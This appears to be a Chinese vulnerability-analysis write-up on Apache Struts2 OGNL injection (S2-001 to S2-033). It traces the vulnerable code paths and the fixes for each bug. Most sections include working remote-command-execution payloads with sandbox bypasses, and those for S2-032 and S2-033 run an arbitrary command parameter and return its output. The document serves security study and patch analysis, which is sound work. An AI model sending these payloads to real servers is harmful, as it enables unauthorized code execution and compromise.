## 漏洞分析

### 简介
Struts2是一个MVC（Model View Controller）框架。如果利用Struts2写一个简单的demo。需要定义一个`Action类 + 视图.jsp + struts.xml`。Action类响应用户请求，视图.jsp文件控制页面上显示的内容。struts.xml匹配Action类和视图.jsp。在jsp的头部加入`<%@ taglib prefix="s" uri="/struts-tags" %>`，用于表明Struts2框架。这样就可以引入很多标签来控制视图。   

常用标签包括：控制标签(`<s:if>, <s:iterator>，控制判断、循环等`)、数据标签(`<s:action>,<s:bean>,<s:property>,<s:set>, <s:url>, <s:a>`)、UI标签(`<s:textfield>, <s:textarea>, <s:select> 代表文本框、字段域、下拉框等页面布局内容`)

Struts2的架构处理请求的流程：`Dispatcher(ActionMapper+FilterDispatcher) -> ActionProxy -> ActionInvocation -> 多个Interceptor -> Action -> Result`。其中ActionProxy的内容是从struts.xml中读取的配置。这个流程属于控制流体系。   

Struts2还有个数据流体系： `ActionContext和ValueStack`。其中ValueStack是ActionContext的一个组成部分。 ActionContext是数据载体，负责数据存储和共享。ValueStack则负责计算，提供了表达式引擎计算的场所。

Struts2漏洞的入口是`OgnlUtil.getValue()`会对表达式进行解析，攻击者可以通过OGNL特性和语法构造恶意表达式。从不同的Interceptor或标签入手最终触发`OgnlUtil.getValue()`。

### Struts2 OGNL语法
Struts2和普通的OGNL有一些不同。Struts中，ValueStack是上下文中的根对象，根据栈结构对其中对象进行排列

对象属性获取，如果多个对象都有blah属性，那么获取位于栈前面的对象。或者根据栈索引获取对象。  
```
species or #animal.species or #animal['species']  // call to animal.getSpecies()
salary or #person.salary or #person['salary'] // call to person.getSalary()
name       // call to animal.getName() because animal is on the top

[0].name   // call to animal.getName()
[1].name   // call to person.getName()
```

静态属性和静态方法的获取。Struts2默认不允许访问静态的，如果要访问需要将常量`struts.ognl.allowStaticMethodAccess`设为true。
```
@some.package.ClassName@FOO_PROPERTY  //访问静态属性
@some.package.ClassName@someMethod()  //访问静态方法
```

括号表达式。`(one)(two)`，one计算完作为根对象对two进行计算。每个括号对应语法树上的一个分支，并从最右边的叶子节点开始解析。
```
(fact)(30H)  // 等价于 #fact(30H)

(expression)(constant)=value  // 执行expression=value
(constant)((expression1)(expression2)) // 先执行expression2 再执行expression1
```

其他内容可参考官方文档: https://commons.apache.org/proper/commons-ognl/language-guide.html

### Struts2历史漏洞

| 漏洞名 | 问题定位 | POC格式 | 影响版本 |
|:----:|:----:|:----:|:----:|
| S2-001 | `<s:textfield>` | `%{#a,#b,...,#c}` | 2.0.0-2.0.8 |
| S2-003, S2-005 | `ParametersInterceptor` | `('\u0023')(bla)(bla)&(a)(('\u0023')(bla))` | 2.0.0-2.1.8.1 |
| S2-009 | `ParametersInterceptor` | `(#a,#b,...,#c)(meh)&z[(name)('meh')]` | 2.0.0-2.3.1.1 |
| S2-007 | `ConversionErrorInterceptor` | `'+(#a,#b,...,#c)+'` | 2.0.0-2.2.3 |
| S2-008 | `CookieInterceptor` | `(#a,#b,...,#c)` | 2.0.0-2.3.1.1 |
| S2-012 | `<result type="redirect">/x.jsp?name=${name}</result>` | `%{#a,#b,...,#c}` | 2.0.0-2.3.14.2 |
| S2-013, S2-014 | `<s:a>,<s:url> & includeParams=all` | `${(#a,#b,...,#c)}` | 2.0.0-2.3.14.1 |
| S2-015 | `<action name="*"><result>{1}.jsp</result></action>` | `${#a,#b,...,#c}` | 2.0.0-2.0.8 |
| S2-016, S2-017 | `"action:", "redirect:" or "redirectAction:` | `${#a,#b,...,#c}` | 2.0.0-2.3.15 |
| S2-019 | `DebuggingInterceptor` | `(#a,#b,...,#c)` | 2.0.0-2.3.15.1 |
| S2-029 | `<s:textfield name="%{xxx}">` | `((#a)(@m)) or (#a,#b...,#c) or (#a,#b...,@m)` | 2.0.0-2.3.24.1 (except 2.3.20.3) |
| S2-032, S2-033, S2-037 | `"method:"` | `#a,#b,...,#c` | 2.3.20-2.3.28 (except 2.3.20.3 、2.3.24.3) |
| S2-045 | `content-type："multipart/form_data"` | `%{(#a).(#b).(#c)}` | 2.3.5-2.3.31 or 2.5-2.5.10 |
| S2-046 | `Content-Disposition / Content-Length` | `%{(#a).(#b).(#c)}` | 2.3.5-2.3.31 or 2.5-2.5.10 |
| S2-052, S2-055 | `ContextTypeInterceptor` | xml/json反序列化payload|  2.1.6-2.3.33 or 2.5-2.5.12 |
| S2-059, S2-061 | `<s:a>,<s:url> & id="%{Name}"` | `%{('a'.(#b).(#c)}` |  2.0.0-2.5.20,S2-061 to 2.5.25 |

### S2-001
漏洞demo如下
```
<s:form action="login">
    <s:textfield name="username" label="username" />
    <s:textfield name="password" label="password" />
    <s:submit></s:submit>
</s:form>
```
表单提交后，调用对应的Action.execute()方法进行处理。在Action处理之前，Struts2先读取表单内容，ParametersInterceptor.doIntercept()将表单中的值放入StackValue中。然后对标签进行处理。doStartTag和doEndTag。在标签处理doEngTag时，会对表单值进行计算
```java
// UIBean
public void evaluateParams() {
    if (this.name != null) {
        name = this.findString(this.name); 
        this.addParameter("name", name);
    }
    ...
    if (name != null) {
        String expr = name;
        if (this.altSyntax()) { //"altSyntax"功能，允许将OGNL表达式插入到文本字符串中进行递归处理
            expr = "%{" + name + "}";
        }
        this.addParameter("nameValue", this.findValue(expr, valueClazz)); 
    }
}
```
name的值如password传入到这个方法中，在`altSyntax`功能开启下会被拼接成`%{password}`进行处理。  
代码中的`this.findString()`实际调用的是`this.findValue()`。最终都会调用`TextParseUtil.translateVariables('%', expr, this.stack);`。代码如下
```java
public static Object translateVariables(char open, String expression, ValueStack stack, Class asType, TextParseUtil.ParsedValueEvaluator evaluator) {
    Object result = expression;

    while(true) { // 递归
        int start = expression.indexOf(open + "{"); // 此时的open默认传入`%`， 截取`%{`的位置
	int length = expression.length();
        int x = start + 2; // `%{`后一位的位置
        int count = 1;
	while(start != -1 && x < length && count != 0) {...} // 遇到`{`,count++，遇到`}`,count--。判断表达式`{}`是否闭合
	if (start == -1 || end == -1 || count != 0) { return ...} // 如果不存在`%{`，或者{}没闭合直接返回
	String var = expression.substring(start + 2, end); // 取出`%{}`中的内容
	Object o = stack.findValue(var, asType); // 对`%{}`中的内容进行OGNL计算
    }
}
```
其中`stack.findValue()`即`OgnlValueStack.findValue()`，最终会调用`OgnlUtil.getValue()`，对OGNL进行解析。  
第一轮执行到`stack.findValue()`，取出password的表单传入值，如`%{1+1}`。那么在第二轮递归时，可以满足取`%{`的逻辑，然后再次进入到`stack.findValue()`，这次就是对`%{}`括号内的OGNL进行计算了。

S2-001修复时，在截取`%{`的位置后多加了循环判断
```
if (start == -1) {
    int pos = false;
    ++loopCount;
    start = expression.indexOf(lookupChars);
}
if (loopCount > maxLoopCount) {
    break;
}
```

### S2-012
```
<package name="S2-012" extends="struts-default">
	<action name="user" class="com.demo.action.UserAction">
		<result name="redirect" type="redirect">/index.jsp?name=${name}</result>
		<result name="input">/index.jsp</result>
		<result name="success">/index.jsp</result>
	</action>
</package>
```
符合UserAction的跳转逻辑后，会访问`/index.jsp?name=${name}`，`ServletRedirectResult`作为跳转入口，会执行到和S2-001一样的`TextParseUtil.translateVariables()`。
```
public static Object translateVariables(char[] openChars, String expression, ValueStack stack, Class asType, TextParseUtil.ParsedValueEvaluator evaluator, int maxLoopCount) {
    Object result = expression;
    char[] arr$ = openChars; // [$,%]
    int len$ = openChars.length;

    for(int i$ = 0; i$ < len$; ++i$) {
        char open = arr$[i$];
        int loopCount = 1;
        int pos = 0;
	String lookupChars = open + "{";
	while(true) {
            int start = expression.indexOf(lookupChars, pos); // (1)
	    if (start == -1) {
                int pos = false;
                ++loopCount;
                start = expression.indexOf(lookupChars);
            }

            if (loopCount > maxLoopCount) {
                break;
            }
	    ...
	    String var = expression.substring(start + 2, end); // (2)
	    Object o = stack.findValue(var, asType); // (3)
	    ...
    }
```
此时第一轮for循环的`expression`是`/index.jsp?name=${name}`，在(1)处查找`${`的位置。在(2)处截取`${}`中的内容，得到`var="name"`。(3)中获取到name传入的真实值，即payload，%{xxx}。然后expression被更新为`/index.jsp?name=%{xxx}`。然后此轮循环完成，返回(1)，再次查找`${}`，没找到，break到最外层的for，进行第二轮for循环
此时第二轮for循环的`expression`是`/index.jsp?name=%{xxx}`，在(1)处找到`%{`的位置，然后在(2)处截取`%{}`的内容。进入(3)进行OGNL计算。

S2-012的payload有两种，第一种和后面S2-003、S2-005等分析一样，由于Runtime@getRuntime调用静态方法被Struts2禁止，想要先更改allowStaticMethodAccess属性来开启静态方法调用。而第二种则是不采用静态方法调用。直接绕过了这种限制。
```
%{#_memberAccess["allowStaticMethodAccess"]=true,@java.lang.Runtime@getRuntime().exec("open -a Calculator.app")}
%{new java.lang.ProcessBuilder(new java.lang.String[]{"open", "-a","Calculator.app"}).start()}
```
S2-001本身禁止了`${}`的循环解析。但是这个跳转利用`${%{}}`绕过了这个限制。S2-012修复则是彻底禁止了二次解析。

### S2-013 & S2-014
jsp文件中如果包含`<s:a>`或者`<s:url>`标签，这两个标签都包含`includeParams`属性，作用是将当前页面的参数转发到链接中。`includeParams`有三种属性值`none、get、all`分别是不转发参数、转发get参数、转发所有参数。
```
<p><s:a id="link1" action="link" includeParams="all">"s:a" tag</s:a></p>
<p><s:url id="link2" action="link" includeParams="all">"s:url" tag</s:url></p>
```
对于标签的处理一般都是从`doStartTag()和doEndTag()`走到`TextParseUtil.translateVariables()`。以`<s:a>`标签为例，它对应Anchor类，在处理参数时，会进行`renderUrl()`操作，获取url对应的action、协议link地址、端口、参数等。然后对参数名和参数值都进行`translateAndEncode()`操作。
```java
// UrlHelper
private static String buildParameterSubstring(String name, String value) {
    StringBuilder builder = new StringBuilder();
    builder.append(translateAndEncode(name));  // S2-014 修复时这步变成encode(name)，不再进行解析操作
    builder.append('=');
    builder.append(translateAndEncode(value));  // S2-014 修复时这步变成encode(value)，不再进行解析操作
    return builder.toString();
}
```
顾名思义，该操作进行变量转换和URL编码。而变量转换实际上是`TextParseUtil.translateVariables()`进行OGNL计算。S2-013的payload如下
```%{#_memberAccess["allowStaticMethodAccess"]=true,@java.lang.Runtime@getRuntime().exec("open /System/Applications/Calculator.app")}```
`TextParseUtil.translateVariables()`提取`%{}`中的内容，然后执行`stack.findValue()`操作。经过上面分析也知道`TextParseUtil.translateVariables()`还支持`${}`的解析，所以S2-014的payload只是变形为`${}`

### S2-003
S2-003的demo写个Action就行。当访问该Action，如`index.action?(xxxx)`时，ParametersInterceptor拦截器会解析参数，将参数通过setParameters()写入到要执行的Action中。
```java
public String intercept(ActionInvocation invocation) throws Exception {
    OgnlContextState.setCreatingNullObjects(contextMap, true); 
    OgnlContextState.setDenyMethodExecution(contextMap, true); // 禁止方法执行，对应属性xwork.MethodAccessor.denyMethodExecution=true
    OgnlContextState.setReportingConversionErrors(contextMap, true);
    ValueStack stack = ac.getValueStack();
    this.setParameters(action, stack, parameters); // setParameters
}

protected void setParameters(Object action, ValueStack stack, Map parameters) {
    Iterator iterator = params.entrySet().iterator();
    while(true) {
        entry = (Entry)iterator.next();
        name = entry.getKey().toString();
        acceptableName = this.acceptableName(name) && (parameterNameAware == null || parameterNameAware.acceptableParameterName(name)); // 对name进行过滤，如果不符合直接return跳出循环
	Object value = entry.getValue();
	stack.setValue(name, value);  // 触发
    }
}
```
此处有两个需要注意的点，(1) ParametersInterceptor默认将`denyMethodExecution`设置为true，在`XWorkMethodAccessor`类调用静态方法前，会先取该属性值进行判断。true禁止了静态方法执行。所以想要执行命令就需要先将这个属性设置为false。
```java
public Object callStaticMethod(Map context, Class aClass, String string, Object[] objects) throws MethodFailedException {
    Boolean exec = (Boolean)context.get("xwork.MethodAccessor.denyMethodExecution");
    boolean e = exec == null ? false : exec;
    return !e ? this.callStaticMethodWithDebugInfo(context, aClass, string, objects) : null; //return super.callStaticMethod(context, aClass, methodName, objects);
}           
```
(2) 其中对name进行过滤没有考虑到编码的问题。OGNL底层支持unicode编码或八进制，也就是说虽然禁止了`#context`这样调用对象，但是可以通过`\u0023context`来绕过。所以在官方漏洞说明中提到的是*绕过ParameterInterceptor内置的对于#使用的保护*。
```java
protected boolean acceptableName(String name) {
    return name.indexOf(61) == -1 && name.indexOf(44) == -1 && name.indexOf(35) == -1 && name.indexOf(58) == -1;
} // 分别对应 `=` `,` `#` `:`
```

可以看到S2-003触发点是`OgnlValueStack.setValue()`，调用到`OgnlUtil.setValue()`时会对name进行`compile()`操作，实际上就是将name转换成对应的数据类型。
```
ASTSequence: "c[0],c[1]..."
ASTMap:  var@ClassName@{key:value} or #var{key:value}
ASTList: {c[0],c[1]}
ASTConst: "" 
ASTAssign: c[0]=c[1]
ASTChain: c[0].c[1]
ASTEval: (c[0])(c[1]) 
ASTKeyValue: key->value
ASTProject: {c[0]}
ASTProperty: [c[0]]
```
S2-003的pyaload形如`('\u0023')(bla)(bla)&(a)(('\u0023')(bla))`，对应的就是ASTEval。那么`OgnlUtil.setValue()`调用的就是`ASTEval.setValueBody()`，代码如下。
```java
protected void setValueBody(OgnlContext context, Object target, Object value) throws OgnlException {
    Object expr = this.children[0].getValue(context, target); // ASTEval.getValueBody()
    Object previousRoot = context.getRoot();
    target = this.children[1].getValue(context, target);
    Node node = expr instanceof Node ? (Node)expr : (Node)Ognl.parseExpression(expr.toString());
    context.setRoot(target);
    node.setValue(context, target, value);
}
```
它把每个括号内的内容当成一个children，获取对应的值，调用`ASTEval.getValueBody()`，该方法和上述代码极为类似，只是将`node.setValue()`变成了`node.getValue()`。如果此时解析的node是OGNL表达式，那么在`node.getValue()`时就会触发表达式执行。

### S2-005
S2-005是S2-003修复的绕过。先看S2-003的payload
```
('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&
('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\'open\u0020/System/Applications/Calculator.app\')')(bla)(bla)
```
(1)将denyMethodExecution属性值改为false，(2)调用了静态方法`@java.lang.Runtime@getRuntime()`。两步都是为了调用静态方法。所以S2-003在修复时，也是为了保护静态方法不被调用。  

如果对比S2-003修复前后的`ParametersInterceptor.setParameters()`，会发现多了如下几行代码
```java
ValueStack newStack = this.valueStackFactory.createValueStack(stack); // this.securityMemberAccess = new SecurityMemberAccess(allowStaticMethodAccess);
...
boolean memberAccessStack = newStack instanceof MemberAccessValueStack;
if (memberAccessStack) {
    MemberAccessValueStack accessValueStack = (MemberAccessValueStack)newStack;
    accessValueStack.setAcceptProperties(this.acceptParams); // 设置securityMemberAccess.acceptProperties，为空
    accessValueStack.setExcludeProperties(this.excludeParams); // 设置securityMemberAccess.excludeProperties，包含两个匹配模式dojo\..*和^struts\..*
}
```
首先ValueStack多了一个securityMemberAccess属性，`this.valueStackFactory.createValueStack`时初始化如下。然后在accessValueStack操作中更新了两个属性。
```
allowStaticMethodAccess = false
excludeProperties = {Collections$EmptySet@24303}  size = 0   -> dojo\..*和^struts\..*
acceptProperties = {Collections$EmptySet@24303}  size = 0
allowPrivateAccess = false
allowProtectedAccess = false
allowPackageProtectedAccess = false
```

在静态方法`@java.lang.Runtime@getRuntime()`调用时调用栈如下（大多漏洞调试时都可以将断点打到`SecurityMemberAccess.isAccessible()`方法上）
```
OgnlRuntime.callStaticMethod()
  XWorkMethodAccessor.callStaticMethod()  -> 这步判断xwork.MethodAccessor.denyMethodExecution
    OgnlRuntime.callAppropriateMethod() 
      OgnlRuntime.isMethodAccessible()
        SecurityMemberAccess.isAccessible() -> 这步判断this.allowStaticMethodAccess属性
```

`SecurityMemberAccess.isAccessible()`方法核心判断如下
```java
if (Modifier.isStatic(modifiers) && member instanceof Method && !this.getAllowStaticMethodAccess()) { //allowStaticMethodAccess属性默认为false，进入if中
    allow = false;
}

if (!allow) { // 如果allow为false，就return false。所以需要将allow赋值为true
    return false;
} else {
    return !super.isAccessible(context, target, member, propertyName) ? false : this.isAcceptableProperty(propertyName);
}
```
如果allow被赋值为true就会进入else，走到`isAcceptableProperty()`方法
```
protected boolean isAcceptableProperty(String name) {
    return this.isAccepted(name) && !this.isExcluded(name);
}
```
要求`isAccepted()`返回true并且isExcluded返回false。`isExcluded()`是默认返回false的。所以只需要`isAccepted()`返回true。即`acceptProperties`属性为空
```java
protected boolean isAccepted(String paramName) {
    if (!this.acceptProperties.isEmpty()) {...}
    else { // 如果acceptProperties属性为空，返回true
        return true;
    }
}

protected boolean isExcluded(String paramName) {
    if (!this.excludeProperties.isEmpty()) {
        Iterator i$ = this.excludeProperties.iterator();

        while(i$.hasNext()) {
	    Pattern pattern = (Pattern)i$.next();
    	    Matcher matcher = pattern.matcher(paramName);
 	    if (matcher.matches()) { //  dojo\..*和^struts\..*能匹配到就返回true
	        return true;
	    }
        }
    }

    return false;
}
```
这些防御方式都是SecurityMemberAccess中新加的。想要绕过防御，根据上述调用栈，在将denyMethodExecution设为false的基础上，(1) 设置SecurityMemberAccess的allowStaticMethodAccess属性为true，(2)设置SecurityMemberAccess的excludeProperties属性为空。所以S2-005的payload如下。
```
(a)(('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(bla))&('\u0023_memberAccess.allowStaticMethodAccess\u003dtrue')(bla)(bla)&(a)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla))&(b)(('\u0023ret\u003d@java.lang.Runtime@getRuntime().exec(\'open\u0020/System/Applications/Calculator.app\')')(bla))
```

S2-005在修复时，加强了ParametersInterceptor的`acceptedParamNames`参数名的正则过滤。在加强了`ParametersInterceptor.setParameters()`处理时会先判断是否为acceptableName。用的就是如下的正则匹配来判断
```
acceptedParamNames="[a-zA-Z0-9\\.\\]\\[\\(\\)_'\\s]+";
```

### S2-009
S2-009是S2-005的绕过。S2-005的修复方式中加强了对参数名`('`，`\'`的过滤。上述S2-005的payload是当作参数名直接传入的。会被过滤掉。但是如果现在参数名使用name此类正常接受的参数，然后将OGNL作为name的参数值。接着利用`z[(name)('lalala')]`来调用name参数值进行OGNL计算。
```
&name=(#context["xwork.MethodAccessor.denyMethodExecution"]= new java.lang.Boolean(false), #_memberAccess["allowStaticMethodAccess"]= new java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app'))(meh)&z[(name)('meh')]=true
```
此处需要注意的是Struts2的取参顺序按照ascii大小来排序。这个payload中有两个参数，`name`和`z[(name)('meh')]`。先要让name成功赋值，再通过`()()`获取name进行计算。那么第二个参数的首字符是要大于n的。


### S2-007
漏洞demo如下
```xml
<validators>
    <field name="age">
        <field-validator type="int">
	    <param name="min">1</param>
	    <param name="max">100</param>
	    <message></message>
        </field-validator>
    </field>
</validators>
```
此漏洞场景是配置了验证规则（xml形式），age的参数值需要为int型。通过文件名`<ActionClassName>-validation.xml`和要验证的Action关联。如果传入字符串型，就会被`ConversionErrorInterceptor`拦截，其拦截逻辑如下
```
public String intercept(ActionInvocation invocation) throws Exception {
    ActionContext invocationContext = invocation.getInvocationContext();
    Map<String, Object> conversionErrors = invocationContext.getConversionErrors();
    ValueStack stack = invocationContext.getValueStack();
    HashMap<Object, Object> fakie = null;
    Iterator i$ = conversionErrors.entrySet().iterator();
    while(i$.hasNext()) {
        ...
        fakie.put(propertyName, this.getOverrideExpr(invocation, value)); // value为age传入的字符串，fakie即为"age"->"'payload'"
    }
    if (fakie != null) {
        invocation.getStack().setExprOverrides(fakie); //  OgnlValueStack.overrides赋值为fakie的值
    }
    return invocation.invoke(); 
```
getOverrideExpr会取出传入的字符串，并用单引号包裹
```
protected Object getOverrideExpr(ActionInvocation invocation, Object value) {
    stack.push(value); // 把传入的value入栈
    var4 = "'" + stack.findValue("top", String.class) + "'"; // 把栈头的元素取出来，并用单引号包裹，即 `payload`
    return var4;
}
```
验证规则匹配到参数类型错误后，会跳转到配置的错误（或跳转）页面，然后Struts2会对jsp页面上的标签进行解析。这部分开始和S2-001非常类似。doEngTag解析标签，执行到`TextParseUtil.translateVariables()`，对age进行值的查询，然后OgnlValueStack.getValue()对值进行OGNL解析
```
private String lookupForOverrides(String expr) {
    if (this.overrides != null && this.overrides.containsKey(expr)) {
        expr = (String)this.overrides.get(expr); // 从OgnlValueStack.overrides取出age对应的值
    }
    return expr;
}
```
payload如下
```
' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app')) + '
```
S2-007这里用的高版本2.2.3进行测试，和S2-005用的版本区别在于，多了个`if(name==null)`的判断，name为空，直接返回true。而无需将excludeProperties属性置为空
```
protected boolean isAcceptableProperty(String name) {
    if (name == null) {
        return true;
    } else {
        return this.isAccepted(name) && !this.isExcluded(name);
    }
}
```
S2-007的payload闭合了`getOverrideExpr()`方法中添加的单引号。这样OGNL可以正常解析。修复时在`stack.findValue("top") `后增加了一步转义，先对字符串中的双引号进行转义，然后再用双引号包裹。这样避免了双引号闭合的可能。
```
protected String escape(Object value){
    return "\"" + StringEscapeUtils.escapeJava(String.valueOf(value)) + "\"";
}
```

### S2-015
官网上给了两种demo。第一种如下，和S2-012重定向类似。要访问的`/${xxx}.jsp`被`TextParseUtil.translateVariables()`提取、解析。
```
<action name="*" class="example.ExampleSupport">
    <result>/example/{1}.jsp</result>
</action>
```
第一种payload如下，可以发现此处对于`allowStaticMethodAccess`相较于之前的payload发生了变化。由`#_memberAccess["allowStaticMethodAccess"]=true`变成了反射写法。究其原因，是SecurityMemberAccess的allowStaticMethodAccess属性变成的final修饰。此处还有一个思路，就是不采用静态方法，而用Processbuilder。
```
${#context['xwork.MethodAccessor.denyMethodExecution']=false,#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),@java.lang.Runtime@getRuntime().exec('open -a Calculator.app')}.action
```
第二种，HttpHeaderResult对头部信息进行处理，同样会走到`TextParseUtil.translateVariables()`进行解析
```
<result type="httpheader">
    <param name="headers.foobar">${message}</param>
</result>
```

### S2-016
问题出在DefaultActionMapper，它会寻找请求匹配的路径。
```
redirect:%{#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),@java.lang.Runtime@getRuntime().exec('open -a Calculator.app')}
```
`DefaultActionMapper.handleSpecialParameters()`会对特殊前缀进行处理，包括`method:`、`action:`、`redirect:`或`redirectAction:`，将导航信息附加到表单中。后续也会调用到`TextParseUtil.translateVariables()`，对前缀后的内容将逆行OGNL计算。

S2-017和这个漏洞是一个了，只不过是重定向漏洞，在`redirect:`后面加上url链接。

修复时，`action:`、`redirect:`或`redirectAction:`，action增加了正则匹配。后两个在 DefaultActionMapper中直接被删除了。

### S2-029
S2-001用到了`<s:textfield name="password"/>`，然后对传入值进行二次解析造成了漏洞。S2-029同样是由于`textfield`标签。但是需要在name字段写成如下形式
```
<s:textfield name="%{message}"></s:textfield>
```
这样`UIBean.evaluateParams()`在对标签进行解析时，对name依次进行`findString()、findValue()、TextParseUtil.translateVariables()`。由于name本身是被`%{}`包裹的。会将name对应的传入值取出。然后在后续的步骤中对值进行解析。这样就避免了单次执行递归解析的限制。分成两次进行解析。
```
if (this.name != null) {
    name = this.findString(this.name);  // (1) %{message}取出message对应的值
    this.addParameter("name", name);
}
...
 if (this.parameters.containsKey("value")) {...}
 else if (this.evaluateNameValue()) {
    Class valueClazz = this.getValueClassType();
    if (valueClazz != null) {
	if (this.value != null) {
	    this.addParameter("nameValue", this.findValue(this.value, valueClazz)); // (2) 对message的值进行OGNL解析
	} 
    }
}
```
在S2-029修复时在struts.excludedClasses属性中增加了很多限制，如下的类都被列入到黑名单中（参照`struts-default.xml`），禁止调用命令执行常用类，并禁止调用SecurityMemberAccess。
```
java.lang.Object,
java.lang.Runtime,
java.lang.System,
java.lang.Class,
java.lang.ClassLoader,
java.lang.Shutdown,
java.lang.ProcessBuilder,
ognl.OgnlContext,
ognl.ClassResolver,
ognl.TypeConverter,
com.opensymphony.xwork2.ognl.SecurityMemberAccess, 
com.opensymphony.xwork2.ActionContex
```

### S2-032
`DefaultActionMapper`对特殊前缀进行处理，包括`method:`、`action:`、`redirect:`或`redirectAction:`。S2-016中对后三个进行了利用。在跳转时会对参数进行OGNL解析。而S2-032则是利用`method:`。`method:`后的内容会被截取，执行到`DefaultActionInvocation.invokeAction()`
```
protected String invokeAction(Object action, ActionConfig actionConfig) throws Exception {
    String methodName = this.proxy.getMethod(); // 获取method
    methodResult = this.ognlUtil.getValue(methodName + "()", this.getStack().getContext(), action); // methodName是`method:`后的内容，和()拼接
}
```
这个漏洞的payload很有意思，首先`method:`最后结尾有个.toString，它和`()`拼接成`toString`方法调用。实际上就是为了闭合代码中的`()`。另外沙箱的绕过方法很巧妙
```
method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=open -a Calculator.app
```

沙箱绕过: `#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS`  
S2-029高版本也是用了这个方式。在之前的payload中都是`#_memberAccess["allowStaticMethodAccess"]=true`。主要源于`SecurityMemberAccess.isAccessible()`判断发生了变化
```
public class SecurityMemberAccess extends DefaultMemberAccess {
    private final boolean allowStaticMethodAccess; // 默认为false

    public boolean isAccessible(Map context, Object target, Member member, String propertyName) {
        Class targetClass = target.getClass();
        Class memberClass = member.getDeclaringClass();
        if (Modifier.isStatic(member.getModifiers()) && this.allowStaticMethodAccess) { //  a. 
            if (!this.isClassExcluded(member.getDeclaringClass())) { // 是否在excludedClasses的黑名单中
	        targetClass = member.getDeclaringClass();
	    }
        }
        if (this.isPackageExcluded(targetClass.getPackage(), memberClass.getPackage())) { return false;}
        else if (this.isClassExcluded(targetClass)) { return false; } // b. 常见利用类在这一步都无法通过校验
    }
}
```
可以看到a.处就防御了之前`#_memberAccess["allowStaticMethodAccess"]=true`的payload,因为即使更改了allowStaticMethodAccess属性，依旧无法通过调用类的黑名单  
b.处防御了`#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')`这种反射的写法，因为反射本身调用的是`java.lang.Class`也在黑名单中。
而payload很巧妙的用了`SecurityMemberAccess`的父类`DefaultMemberAccess`，父类的`isAccessible()`方法中并没有对静态方法和调用类进行限制。也就是让执行流程从`SecurityMemberAccess.isAccessible()`改为执行`DefaultMemberAccess.isAccessible()`直接规避了防御和黑名单，非常巧妙。在利用时，依靠OgnlContext的一行代码
```
public static final MemberAccess DEFAULT_MEMBER_ACCESS = new DefaultMemberAccess(false);
```
通过`#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS`赋值，将`SecurityMemberAccess`替换为`DefaultMemberAccess`

S2-032在修复时直接在`method:`后内容截取时加入了正则`[a-zA-Z0-9._!/\\-]*`

### S2-033
S2-033的官方描述`Remote Code Execution can be performed when using REST Plugin with ! operator when Dynamic Method Invocation is enabled.`需要开启动态调用
S2-033和S2-032很类似。S2-032的`DefaultActionMapper`没有对参数名进行过滤。导致执行到`DefaultActionInvocation.invokeAction()`后恶意OGNL被执行。S2-032在修复时也是加入了过滤的正则。而S2-033则是采用`RestActionMapper`为入口替换了`DefaultActionMapper`。绕过了正则判断，最终还是执行到`DefaultActionInvocation.invokeAction()`

这里需要提一下动态调用必须开启才能利用的逻辑，看一下`RestActionMapper.getMapping()`的代码
```
public ActionMapping getMapping(HttpServletRequest request, ConfigurationManager configManager) {
    this.handleSpecialParameters(request, mapping); // 对特殊字符进行转义
    if (mapping.getName() == null) {
	return null;
    } else {
	this.handleDynamicMethodInvocation(mapping, mapping.getName()); // (1) 如果存在`!`，mapping.setMethod(截取`!`后的内容)
	String fullName = mapping.getName(); // 获取全路径名，例如orders/4/payload
	if (fullName != null && fullName.length() > 0) { 
	    int lastSlashPos = fullName.lastIndexOf(47); //最后一个`/`的位置
	    if (lastSlashPos > -1) {
	        int prevSlashPos = fullName.lastIndexOf(47, lastSlashPos - 1);
		if (prevSlashPos > -1) {
		    mapping.setMethod(fullName.substring(lastSlashPos + 1)); // (2) 截取最后一个`/`的位置后的字符串
	        }
...
}
```
动态调用的判断就在(1)这步，开启后截取`!`后的内容赋值给method。到了`DefaultActionInvocation.invokeAction()`就可以正常取出method值进行OGNL计算。
```
private void handleDynamicMethodInvocation(ActionMapping mapping, String name) {
    int exclamation = name.lastIndexOf("!");
    if (exclamation != -1) {
        mapping.setName(name.substring(0, exclamation));
        if (this.allowDynamicMethodCalls) { // 如果开启了动态调用
	    mapping.setMethod(name.substring(exclamation + 1));
        } else {
	    mapping.setMethod((String)null);
        }
    }
}
```
动态调用开启需要在struts.xml中进行配置，配置如下
```
<constant name="struts.enable.DynamicMethodInvocation" value="true">
```
S2-033payload如下
```
!%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23process%3D@java.lang.Runtime@getRuntime%28%29.exec(%23parameters.command[0]),%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%2C@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%2C%23ros.flush%28%29,%23xx%3d123,%23xx.toString.json?&command=open -a Calculator.app
```
